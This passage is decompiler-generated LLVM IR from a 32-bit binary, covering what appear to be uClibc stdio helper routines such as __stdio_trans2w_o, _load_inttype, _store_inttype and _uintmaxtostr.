  %v0_804e122 = load i32, i32* @ebx, align 4
  %v1_804e122 = add i32 %v0_804e122, 16
  %v2_804e122 = inttoptr i32 %v1_804e122 to i32*
  %v3_804e122 = load i32, i32* %v2_804e122, align 4
  %v5_804e122 = sub i32 %v3_804e122, %v2_804e120
  store i32 %v5_804e122, i32* %v2_804e122, align 4
  %v0_804e125 = load i32, i32* @edi, align 4
  %v1_804e125 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e125 = sub i32 %v0_804e125, %v1_804e125
  store i32 %v2_804e125, i32* @edi, align 4
  br label %dec_label_pc_804e15a

dec_label_pc_804e129:                             ; preds = %dec_label_pc_804e0bb
  %v2_804e129 = add i32 %arg3, 8
  %v3_804e129 = inttoptr i32 %v2_804e129 to i32*
  %v4_804e129 = load i32, i32* %v3_804e129, align 4
  %v15_804e129 = icmp eq i32 %v3_804e095, %v4_804e129
  br i1 %v15_804e129, label %dec_label_pc_804e142, label %dec_label_pc_804e12e

dec_label_pc_804e12e:                             ; preds = %dec_label_pc_804e129
  %v1_804e132 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_804e132, i32* %eax.global-to-local, align 4
  %v1_804e13a = icmp eq i32 %v1_804e132, 0
  br i1 %v1_804e13a, label %dec_label_pc_804e12e.dec_label_pc_804e142_crit_edge, label %dec_label_pc_804e13e

dec_label_pc_804e12e.dec_label_pc_804e142_crit_edge: ; preds = %dec_label_pc_804e12e
  %v0_804e142.pre = load i32, i32* @edi, align 4
  %v0_804e14a.pre = load i32, i32* @ebx, align 4
  %v2_804e151.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804e142

dec_label_pc_804e13e:                             ; preds = %dec_label_pc_804e12e
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804e15a

dec_label_pc_804e142:                             ; preds = %dec_label_pc_804e12e.dec_label_pc_804e142_crit_edge, %dec_label_pc_804e129, %entry
  %v2_804e151 = phi i32 [ %v2_804e151.pre, %dec_label_pc_804e12e.dec_label_pc_804e142_crit_edge ], [ %v0_804e077, %dec_label_pc_804e129 ], [ %v0_804e077, %entry ]
  %v0_804e14a = phi i32 [ %v0_804e14a.pre, %dec_label_pc_804e12e.dec_label_pc_804e142_crit_edge ], [ %arg3, %dec_label_pc_804e129 ], [ %arg3, %entry ]
  %v0_804e142 = phi i32 [ %v0_804e142.pre, %dec_label_pc_804e12e.dec_label_pc_804e142_crit_edge ], [ %arg2, %dec_label_pc_804e129 ], [ %arg2, %entry ]
  store i32 %v2_804e151, i32* @ebx, align 4
  store i32 %v0_804e075, i32* @edi, align 4
  %v4_804e155 = inttoptr i32 %v0_804e14a to i16*
  %v5_804e155 = call i32 @__stdio_WRITE(i16* %v4_804e155, i32 %v0_804e142, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804e155, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e15a

dec_label_pc_804e15a:                             ; preds = %dec_label_pc_804e103, %dec_label_pc_804e0eb, %dec_label_pc_804e0da, %dec_label_pc_804e0c1, %dec_label_pc_804e13e, %dec_label_pc_804e11c, %dec_label_pc_804e0a7, %dec_label_pc_804e142
  %v0_804e15d = load i32, i32* @edi, align 4
  store i32 %v0_804e15d, i32* %eax.global-to-local, align 4
  %v2_804e15f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e15f, i32* @ebx, align 4
  store i32 %v0_804e076, i32* @esi, align 4
  store i32 %v0_804e075, i32* @edi, align 4
  store i32 %v0_804e074, i32* @ebp, align 4
  ret i32 %v0_804e15d

; uselistorder directives
  uselistorder i32 %v2_804e120, { 1, 0 }
  uselistorder i32 %v4_804e10e, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804e105, { 1, 0, 2 }
  uselistorder i32 %v0_804e0fb, { 3, 0, 1, 2 }
  uselistorder i32 %v2_804e0bb, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_804e075, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_804e15a, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_804e103, { 1, 0 }
  uselistorder label %dec_label_pc_804e0a7, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804e164 = load i32, i32* @ebx, align 4
  %v4_804e168 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804e168, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_804e170 = bitcast i16* %arg1 to i32*
  %v2_804e170 = load i32, i32* %v1_804e170, align 4
  store i32 %v2_804e170, i32* %eax.global-to-local, align 4
  %v1_804e172 = urem i32 %v2_804e170, 65536
  store i32 %v1_804e172, i32* %edx.global-to-local, align 4
  %v2_804e175 = and i32 %v1_804e172, %arg2
  %v3_804e175 = icmp eq i32 %v2_804e175, 0
  %v1_804e177 = icmp eq i1 %v3_804e175, false
  br i1 %v1_804e177, label %dec_label_pc_804e186, label %dec_label_pc_804e179

dec_label_pc_804e179:                             ; preds = %entry
  %v1_804e179 = and i32 %v2_804e170, 2176
  %v2_804e179 = icmp eq i32 %v1_804e179, 0
  store i32 %v1_804e179, i32* %edx.global-to-local, align 4
  %v1_804e17f = icmp eq i1 %v2_804e179, false
  br i1 %v1_804e17f, label %dec_label_pc_804e18e, label %dec_label_pc_804e181

dec_label_pc_804e181:                             ; preds = %dec_label_pc_804e179
  %v2_804e181 = or i32 %v2_804e170, %arg2
  store i32 %v2_804e181, i32* %eax.global-to-local, align 4
  %v1_804e183 = trunc i32 %v2_804e181 to i16
  store i16 %v1_804e183, i16* %arg1, align 2
  %v0_804e186.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e186

dec_label_pc_804e186:                             ; preds = %entry, %dec_label_pc_804e181
  %v0_804e1cb = phi i32 [ %v4_804e168, %entry ], [ %v0_804e186.pre, %dec_label_pc_804e181 ]
  %v1_804e186 = inttoptr i32 %v0_804e1cb to i16*
  %v2_804e186 = load i16, i16* %v1_804e186, align 2
  %v3_804e186 = zext i16 %v2_804e186 to i32
  store i32 %v3_804e186, i32* %edx.global-to-local, align 4
  %v2_804e189 = and i16 %v2_804e186, 32
  %v3_804e189 = icmp eq i16 %v2_804e189, 0
  br i1 %v3_804e189, label %dec_label_pc_804e1a2, label %dec_label_pc_804e18e

dec_label_pc_804e18e:                             ; preds = %dec_label_pc_804e186, %dec_label_pc_804e179
  %v1_804e18e = call i32 @__errno_location(i32 %v0_804e164)
  store i32 %v1_804e18e, i32* %eax.global-to-local, align 4
  %v1_804e193 = inttoptr i32 %v1_804e18e to i32*
  store i32 9, i32* %v1_804e193, align 4
  br label %dec_label_pc_804e199

dec_label_pc_804e199:                             ; preds = %dec_label_pc_804e1b9, %dec_label_pc_804e18e
  %v0_804e199 = load i32, i32* @ebx, align 4
  %v1_804e199 = inttoptr i32 %v0_804e199 to i16*
  %v2_804e199 = load i16, i16* %v1_804e199, align 2
  %v3_804e199 = or i16 %v2_804e199, 8
  store i16 %v3_804e199, i16* %v1_804e199, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e1fc

dec_label_pc_804e1a2:                             ; preds = %dec_label_pc_804e186
  %v2_804e1a2 = urem i16 %v2_804e186, 4
  %v3_804e1a2 = icmp eq i16 %v2_804e1a2, 0
  br i1 %v3_804e1a2, label %dec_label_pc_804e1e8, label %dec_label_pc_804e1a7

dec_label_pc_804e1a7:                             ; preds = %dec_label_pc_804e1a2
  %v2_804e1a7 = and i32 %v3_804e186, 4
  %v3_804e1a7 = icmp eq i32 %v2_804e1a7, 0
  %v1_804e1aa = icmp eq i1 %v3_804e1a7, false
  br i1 %v1_804e1aa, label %dec_label_pc_804e1d8, label %dec_label_pc_804e1ac

dec_label_pc_804e1ac:                             ; preds = %dec_label_pc_804e1a7
  %v1_804e1ac = add i32 %v0_804e1cb, 20
  %v2_804e1ac = inttoptr i32 %v1_804e1ac to i32*
  %v3_804e1ac = load i32, i32* %v2_804e1ac, align 4
  store i32 %v3_804e1ac, i32* %eax.global-to-local, align 4
  %v2_804e1af = add i32 %v0_804e1cb, 16
  %v3_804e1af = inttoptr i32 %v2_804e1af to i32*
  %v4_804e1af = load i32, i32* %v3_804e1af, align 4
  %v15_804e1af = icmp eq i32 %v3_804e1ac, %v4_804e1af
  %v1_804e1b2 = icmp eq i1 %v15_804e1af, false
  br i1 %v1_804e1b2, label %dec_label_pc_804e1b9, label %dec_label_pc_804e1b4

dec_label_pc_804e1b4:                             ; preds = %dec_label_pc_804e1ac
  %v2_804e1b4 = and i32 %v3_804e186, 2
  %v3_804e1b4 = icmp eq i32 %v2_804e1b4, 0
  br i1 %v3_804e1b4, label %dec_label_pc_804e1d8, label %dec_label_pc_804e1b9

dec_label_pc_804e1b9:                             ; preds = %dec_label_pc_804e1b4, %dec_label_pc_804e1ac
  %v1_804e1b9 = and i32 %v3_804e186, 1024
  store i32 %v1_804e1b9, i32* %edx.global-to-local, align 4
  %tmp17 = udiv i32 %v1_804e1b9, 1024
  %tmp18 = xor i32 %tmp17, 3
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v5_804e1cc = call i32 @__GI_fseek(i32 %v0_804e1cb, i32 0, i32 %tmp18, i32 %v1_804e1b9)
  store i32 %v5_804e1cc, i32* %eax.global-to-local, align 4
  %v1_804e1d4 = icmp eq i32 %v5_804e1cc, 0
  %v1_804e1d6 = icmp eq i1 %v1_804e1d4, false
  br i1 %v1_804e1d6, label %dec_label_pc_804e199, label %dec_label_pc_804e1b9.dec_label_pc_804e1d8_crit_edge

dec_label_pc_804e1b9.dec_label_pc_804e1d8_crit_edge: ; preds = %dec_label_pc_804e1b9
  %v0_804e1d8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e1d8

dec_label_pc_804e1d8:                             ; preds = %dec_label_pc_804e1b9.dec_label_pc_804e1d8_crit_edge, %dec_label_pc_804e1b4, %dec_label_pc_804e1a7
  %v10_804e1d8 = phi i32 [ %v0_804e1d8.pre, %dec_label_pc_804e1b9.dec_label_pc_804e1d8_crit_edge ], [ %v0_804e1cb, %dec_label_pc_804e1b4 ], [ %v0_804e1cb, %dec_label_pc_804e1a7 ]
  %v1_804e1d8 = inttoptr i32 %v10_804e1d8 to i16*
  %v2_804e1d8 = load i16, i16* %v1_804e1d8, align 2
  %v3_804e1d8 = and i16 %v2_804e1d8, -4
  store i16 %v3_804e1d8, i16* %v1_804e1d8, align 2
  %v0_804e1dc = load i32, i32* @ebx, align 4
  %v1_804e1dc = add i32 %v0_804e1dc, 8
  %v2_804e1dc = inttoptr i32 %v1_804e1dc to i32*
  %v3_804e1dc = load i32, i32* %v2_804e1dc, align 4
  store i32 %v3_804e1dc, i32* %eax.global-to-local, align 4
  %v2_804e1df = add i32 %v0_804e1dc, 24
  %v3_804e1df = inttoptr i32 %v2_804e1df to i32*
  store i32 %v3_804e1dc, i32* %v3_804e1df, align 4
  %v0_804e1e2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e1e2 = load i32, i32* @ebx, align 4
  %v2_804e1e2 = add i32 %v1_804e1e2, 16
  %v3_804e1e2 = inttoptr i32 %v2_804e1e2 to i32*
  store i32 %v0_804e1e2, i32* %v3_804e1e2, align 4
  %v0_804e1e5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e1e5 = load i32, i32* @ebx, align 4
  %v2_804e1e5 = add i32 %v1_804e1e5, 20
  %v3_804e1e5 = inttoptr i32 %v2_804e1e5 to i32*
  store i32 %v0_804e1e5, i32* %v3_804e1e5, align 4
  %v0_804e1e8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e1e8

dec_label_pc_804e1e8:                             ; preds = %dec_label_pc_804e1a2, %dec_label_pc_804e1d8
  %v9_804e1e8 = phi i32 [ %v0_804e1cb, %dec_label_pc_804e1a2 ], [ %v0_804e1e8.pre, %dec_label_pc_804e1d8 ]
  %v1_804e1e8 = inttoptr i32 %v9_804e1e8 to i16*
  %v2_804e1e8 = load i16, i16* %v1_804e1e8, align 2
  %v3_804e1e8 = or i16 %v2_804e1e8, 64
  store i16 %v3_804e1e8, i16* %v1_804e1e8, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_804e1ee = load i32, i32* @ebx, align 4
  %v1_804e1ee = inttoptr i32 %v0_804e1ee to i16*
  %v2_804e1ee = load i16, i16* %v1_804e1ee, align 2
  %v3_804e1ee = zext i16 %v2_804e1ee to i32
  store i32 %v3_804e1ee, i32* %eax.global-to-local, align 4
  %v3_804e1f1 = and i16 %v2_804e1ee, 2816
  %v4_804e1f1 = icmp eq i16 %v3_804e1f1, 0
  %v1_804e1f4 = icmp eq i1 %v4_804e1f1, false
  br i1 %v1_804e1f4, label %dec_label_pc_804e1fc, label %dec_label_pc_804e1f6

dec_label_pc_804e1f6:                             ; preds = %dec_label_pc_804e1e8
  %v1_804e1f6 = add i32 %v0_804e1ee, 12
  %v2_804e1f6 = inttoptr i32 %v1_804e1f6 to i32*
  %v3_804e1f6 = load i32, i32* %v2_804e1f6, align 4
  store i32 %v3_804e1f6, i32* %eax.global-to-local, align 4
  %v2_804e1f9 = add i32 %v0_804e1ee, 28
  %v3_804e1f9 = inttoptr i32 %v2_804e1f9 to i32*
  store i32 %v3_804e1f6, i32* %v3_804e1f9, align 4
  %v0_804e1fc.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e1fc

dec_label_pc_804e1fc:                             ; preds = %dec_label_pc_804e1e8, %dec_label_pc_804e199, %dec_label_pc_804e1f6
  %v0_804e1fc = phi i32 [ 0, %dec_label_pc_804e1e8 ], [ -1, %dec_label_pc_804e199 ], [ %v0_804e1fc.pre, %dec_label_pc_804e1f6 ]
  store i32 %v0_804e1fc, i32* %eax.global-to-local, align 4
  %v2_804e1fe = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e1fe, i32* %edx.global-to-local, align 4
  store i32 %v0_804e164, i32* @ebx, align 4
  ret i32 %v0_804e1fc

; uselistorder directives
  uselistorder i32 %v0_804e1fc, { 1, 0 }
  uselistorder i32 %v0_804e1ee, { 1, 0, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32 %v1_804e1b9, { 1, 0, 2 }
  uselistorder i32 %v0_804e1cb, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_804e172, { 1, 0 }
  uselistorder i32 %v2_804e170, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804e164, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 1024, { 0, 13, 3, 11, 8, 14, 4, 1, 2, 9, 5, 6, 12, 7, 10 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e1fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e1e8, { 1, 0 }
  uselistorder label %dec_label_pc_804e186, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_804e20c = icmp slt i32 %tmp, 0
  %v3_804e235 = and i32 %tmp5, 2048
  %v4_804e235 = icmp eq i32 %v3_804e235, 0
  br i1 %v5_804e20c, label %dec_label_pc_804e235, label %dec_label_pc_804e213

dec_label_pc_804e213:                             ; preds = %entry
  %v1_804e216 = icmp eq i1 %v4_804e235, false
  br i1 %v1_804e216, label %dec_label_pc_804e23a, label %dec_label_pc_804e218

dec_label_pc_804e218:                             ; preds = %dec_label_pc_804e213
  %v1_804e218 = inttoptr i32 %tmp4 to i32*
  %v2_804e218 = load i32, i32* %v1_804e218, align 4
  %v6_804e21a = icmp eq i32 %tmp5, 256
  %v1_804e220 = icmp eq i1 %v6_804e21a, false
  br i1 %v1_804e220, label %dec_label_pc_804e227, label %dec_label_pc_804e222

dec_label_pc_804e222:                             ; preds = %dec_label_pc_804e218
  %v1_804e222 = urem i32 %v2_804e218, 256
  br label %dec_label_pc_804e232

dec_label_pc_804e227:                             ; preds = %dec_label_pc_804e218
  %v6_804e227 = icmp eq i32 %tmp5, 512
  %v1_804e22d = icmp eq i1 %v6_804e227, false
  br i1 %v1_804e22d, label %dec_label_pc_804e232, label %dec_label_pc_804e22f

dec_label_pc_804e22f:                             ; preds = %dec_label_pc_804e227
  %v1_804e22f = urem i32 %v2_804e218, 65536
  br label %dec_label_pc_804e232

dec_label_pc_804e232:                             ; preds = %dec_label_pc_804e227, %dec_label_pc_804e222, %dec_label_pc_804e22f
  %v0_804e234 = phi i32 [ %v2_804e218, %dec_label_pc_804e227 ], [ %v1_804e222, %dec_label_pc_804e222 ], [ %v1_804e22f, %dec_label_pc_804e22f ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_804e234

dec_label_pc_804e235:                             ; preds = %entry
  br i1 %v4_804e235, label %dec_label_pc_804e240, label %dec_label_pc_804e23a

dec_label_pc_804e23a:                             ; preds = %dec_label_pc_804e235, %dec_label_pc_804e213
  %v1_804e23a = add i32 %tmp4, 4
  %v2_804e23a = inttoptr i32 %v1_804e23a to i32*
  %v3_804e23a = load i32, i32* %v2_804e23a, align 4
  store i32 %v3_804e23a, i32* @edx, align 4
  %v1_804e23d = inttoptr i32 %tmp4 to i32*
  %v2_804e23d = load i32, i32* %v1_804e23d, align 4
  ret i32 %v2_804e23d

dec_label_pc_804e240:                             ; preds = %dec_label_pc_804e235
  %v1_804e240 = inttoptr i32 %tmp4 to i32*
  %v2_804e240 = load i32, i32* %v1_804e240, align 4
  %v6_804e242 = icmp eq i32 %tmp5, 256
  %v1_804e248 = icmp eq i1 %v6_804e242, false
  br i1 %v1_804e248, label %dec_label_pc_804e24f, label %dec_label_pc_804e24a

dec_label_pc_804e24a:                             ; preds = %dec_label_pc_804e240
  %v1_804e24a = mul i32 %v2_804e240, 16777216
  %v2_804e24a = sdiv i32 %v1_804e24a, 16777216
  br label %dec_label_pc_804e258

dec_label_pc_804e24f:                             ; preds = %dec_label_pc_804e240
  %v6_804e24f = icmp eq i32 %tmp5, 512
  %v1_804e255 = icmp eq i1 %v6_804e24f, false
  br i1 %v1_804e255, label %dec_label_pc_804e258, label %dec_label_pc_804e257

dec_label_pc_804e257:                             ; preds = %dec_label_pc_804e24f
  %v1_804e257 = mul i32 %v2_804e240, 65536
  %v2_804e257 = sdiv i32 %v1_804e257, 65536
  br label %dec_label_pc_804e258

dec_label_pc_804e258:                             ; preds = %dec_label_pc_804e24f, %dec_label_pc_804e24a, %dec_label_pc_804e257
  %v0_804e258 = phi i32 [ %v2_804e240, %dec_label_pc_804e24f ], [ %v2_804e24a, %dec_label_pc_804e24a ], [ %v2_804e257, %dec_label_pc_804e257 ]
  %v1_804e258 = ashr i32 %v0_804e258, 31
  store i32 %v1_804e258, i32* @edx, align 4
  ret i32 %v0_804e258

; uselistorder directives
  uselistorder i32 %v0_804e258, { 1, 0 }
  uselistorder i32 %v2_804e240, { 2, 0, 1 }
  uselistorder i32 %v2_804e218, { 2, 0, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804e258, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e232, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_4()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804e25c = load i32, i32* @ebx, align 4
  store i32 %v0_804e25c, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_804e261 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_804e261, i32* %ebx.global-to-local, align 4
  %v4_804e265 = trunc i32 %tmp4 to i16
  %v6_804e26d = icmp eq i32 %tmp6, 256
  %v1_804e273 = icmp eq i1 %v6_804e26d, false
  br i1 %v1_804e273, label %dec_label_pc_804e279, label %dec_label_pc_804e275

dec_label_pc_804e275:                             ; preds = %entry
  %v2_804e275 = trunc i32 %tmp4 to i8
  %v4_804e275 = bitcast i16* %tmp5 to i8*
  store i8 %v2_804e275, i8* %v4_804e275, align 1
  br label %dec_label_pc_804e297

dec_label_pc_804e279:                             ; preds = %entry
  %v6_804e279 = icmp eq i32 %tmp6, 2048
  %v1_804e27f = icmp eq i1 %v6_804e279, false
  br i1 %v1_804e27f, label %dec_label_pc_804e288, label %dec_label_pc_804e281

dec_label_pc_804e281:                             ; preds = %dec_label_pc_804e279
  %sext2 = mul i32 %tmp4, 65536
  %v1_804e281 = sdiv i32 %sext2, 65536
  %v3_804e281 = bitcast i16* %tmp5 to i32*
  store i32 %v1_804e281, i32* %v3_804e281, align 4
  %v0_804e283 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e283 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e283 = add i32 %v1_804e283, 4
  %v3_804e283 = inttoptr i32 %v2_804e283 to i32*
  store i32 %v0_804e283, i32* %v3_804e283, align 4
  br label %dec_label_pc_804e297

dec_label_pc_804e288:                             ; preds = %dec_label_pc_804e279
  %v6_804e288 = icmp eq i32 %tmp6, 512
  %v1_804e28e = icmp eq i1 %v6_804e288, false
  br i1 %v1_804e28e, label %dec_label_pc_804e295, label %dec_label_pc_804e290

dec_label_pc_804e290:                             ; preds = %dec_label_pc_804e288
  store i16 %v4_804e265, i16* %tmp5, align 2
  br label %dec_label_pc_804e297

dec_label_pc_804e295:                             ; preds = %dec_label_pc_804e288
  %sext3 = mul i32 %tmp4, 65536
  %v1_804e295 = sdiv i32 %sext3, 65536
  %v3_804e295 = bitcast i16* %tmp5 to i32*
  store i32 %v1_804e295, i32* %v3_804e295, align 4
  br label %dec_label_pc_804e297

dec_label_pc_804e297:                             ; preds = %dec_label_pc_804e290, %dec_label_pc_804e281, %dec_label_pc_804e275, %dec_label_pc_804e295
  %v2_804e297 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e297, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_804e298 = sdiv i32 %sext, 65536
  ret i32 %v1_804e298

; uselistorder directives
  uselistorder label %dec_label_pc_804e297, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_804e2a7 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804e2a7, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_804e2b3 = icmp slt i32 %arg4, 0
  %v1_804e2b5 = icmp eq i1 %v2_804e2b3, false
  br i1 %v1_804e2b5, label %dec_label_pc_804e2d6, label %dec_label_pc_804e2b7

dec_label_pc_804e2b7:                             ; preds = %entry
  %v1_804e2b7 = sub i32 0, %arg4
  store i32 %v1_804e2b7, i32* %esi.global-to-local, align 4
  %v2_804e2b9 = icmp slt i32 %arg3, 0
  %v1_804e2bb = icmp eq i1 %v2_804e2b9, false
  br i1 %v1_804e2bb, label %dec_label_pc_804e2d6, label %dec_label_pc_804e2bd

dec_label_pc_804e2bd:                             ; preds = %dec_label_pc_804e2b7
  %v1_804e2bd = sub i32 0, %arg2
  %v5_804e2bd = icmp ne i32 %arg2, 0
  store i32 %v1_804e2bd, i32* %ecx.global-to-local, align 4
  %v2_804e2bf = zext i1 %v5_804e2bd to i32
  %v3_804e2bf = add i32 %v2_804e2bf, %arg3
  %v1_804e2ca = sub i32 0, %v3_804e2bf
  store i32 %v1_804e2ca, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e2d6

dec_label_pc_804e2d6:                             ; preds = %entry, %dec_label_pc_804e2b7, %dec_label_pc_804e2bd
  %v0_804e2db = phi i32 [ %v1_804e2b7, %dec_label_pc_804e2bd ], [ %v1_804e2b7, %dec_label_pc_804e2b7 ], [ %arg4, %entry ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_804e2bd ], [ 0, %dec_label_pc_804e2b7 ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_804e2db
  %tmp35 = urem i32 -1, %v0_804e2db
  %v1_804e2dd = add i32 %tmp35, 1
  store i8 0, i8* %arg1, align 1
  %v1_804e2e1 = load i32, i32* %esi.global-to-local, align 4
  %v12_804e2e1 = icmp eq i32 %v1_804e2dd, %v1_804e2e1
  %v1_804e2eb = icmp eq i1 %v12_804e2e1, false
  br i1 %v1_804e2eb, label %dec_label_pc_804e2fa, label %dec_label_pc_804e2ed

dec_label_pc_804e2ed:                             ; preds = %dec_label_pc_804e2d6
  %v1_804e2ed = add i32 %div, 1
  br label %dec_label_pc_804e2fa

dec_label_pc_804e2fa:                             ; preds = %dec_label_pc_804e2d6, %dec_label_pc_804e2ed
  %stack_var_-20.0.off0 = phi i32 [ %v1_804e2dd, %dec_label_pc_804e2d6 ], [ 0, %dec_label_pc_804e2ed ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_804e2d6 ], [ %v1_804e2ed, %dec_label_pc_804e2ed ]
  %v0_804e2fa = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804e2fa, i32* %ebp.global-to-local, align 4
  %v0_804e2fc = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804e2fc, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e302

dec_label_pc_804e302:                             ; preds = %dec_label_pc_804e341, %dec_label_pc_804e2fa
  %v0_804e339 = phi i32 [ %v0_804e352, %dec_label_pc_804e341 ], [ %v0_804e2fa, %dec_label_pc_804e2fa ]
  %v0_804e306 = phi i32 [ %v1_804e354, %dec_label_pc_804e341 ], [ %v0_804e2fc, %dec_label_pc_804e2fa ]
  %v1_804e302 = icmp eq i32 %v0_804e306, 0
  br i1 %v1_804e302, label %dec_label_pc_804e339, label %dec_label_pc_804e306

dec_label_pc_804e306:                             ; preds = %dec_label_pc_804e302
  %v0_804e30a = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_804e306, %v0_804e30a
  %tmp36 = urem i32 %v0_804e306, %v0_804e30a
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_804e339, %v0_804e30a
  %tmp37 = urem i32 %v0_804e339, %v0_804e30a
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_804e31d = mul i32 %tmp36, %stack_var_-20.0.off0
  %v2_804e321 = add i32 %tmp37, %v6_804e31d
  %v8_804e327 = mul i32 %tmp36, %stack_var_-24.0.in
  %v2_804e32c = add i32 %div8, %v8_804e327
  store i32 %v2_804e32c, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_804e321, %v0_804e30a
  %tmp38 = urem i32 %v2_804e321, %v0_804e30a
  %v2_804e334 = add i32 %div9, %v2_804e32c
  br label %dec_label_pc_804e341

dec_label_pc_804e339:                             ; preds = %dec_label_pc_804e302
  %v0_804e33d = load i32, i32* %esi.global-to-local, align 4
  %div12 = udiv i32 %v0_804e339, %v0_804e33d
  %tmp39 = urem i32 %v0_804e339, %v0_804e33d
  br label %dec_label_pc_804e341

dec_label_pc_804e341:                             ; preds = %dec_label_pc_804e306, %dec_label_pc_804e339
  %v0_804e347 = phi i32 [ %tmp38, %dec_label_pc_804e306 ], [ %tmp39, %dec_label_pc_804e339 ]
  %storemerge = phi i32 [ %v2_804e334, %dec_label_pc_804e306 ], [ %div12, %dec_label_pc_804e339 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_804e341 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e341 = add i32 %v0_804e341, -1
  store i32 %v1_804e341, i32* %edi.global-to-local, align 4
  %tmp40 = icmp ult i32 %v0_804e347, 10
  %storemerge14.in.v = select i1 %tmp40, i32 48, i32 %arg5
  %storemerge14.in = add i32 %storemerge14.in.v, %v0_804e347
  %v8_804e347 = trunc i32 %storemerge14.in to i8
  %v3_804e350 = inttoptr i32 %v1_804e341 to i8*
  store i8 %v8_804e347, i8* %v3_804e350, align 1
  %v0_804e352 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e354 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e354 = or i32 %v1_804e354, %v0_804e352
  %v3_804e354 = icmp eq i32 %v2_804e354, 0
  %v1_804e356 = icmp eq i1 %v3_804e354, false
  br i1 %v1_804e356, label %dec_label_pc_804e302, label %dec_label_pc_804e358

